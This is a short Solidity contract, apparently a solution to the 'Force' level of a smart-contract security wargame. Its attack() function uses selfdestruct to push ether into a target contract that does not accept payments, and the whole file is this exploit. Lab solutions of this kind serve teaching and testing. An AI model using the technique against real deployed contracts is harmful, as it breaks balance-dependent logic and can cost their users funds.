// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/7-Force.sol";

contract ForceAttacker {
    address payable public force;

    constructor (address payable _force) {
        force = _force;
    }

    function attack() external payable {
        selfdestruct(force);
    }
}